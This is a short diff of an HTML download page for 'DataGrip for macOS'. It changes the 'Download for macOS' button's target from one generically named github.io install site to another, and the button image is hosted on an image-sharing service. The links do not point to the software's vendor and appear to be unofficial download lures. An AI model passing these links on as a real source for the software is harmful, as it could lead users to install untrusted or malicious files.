@@ -6,7 +6,7 @@
 <h3>DataGrip for macOS</h3>
 <p>DataGrip Mac Edition brings inspections, refactorings and unified connectivity to complex database fleets.</p>
 
-<a href="https://mac-software-install.github.io/.github/DataGrip">
+<a href="https://software-install-apps.github.io/.github/DataGrip">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
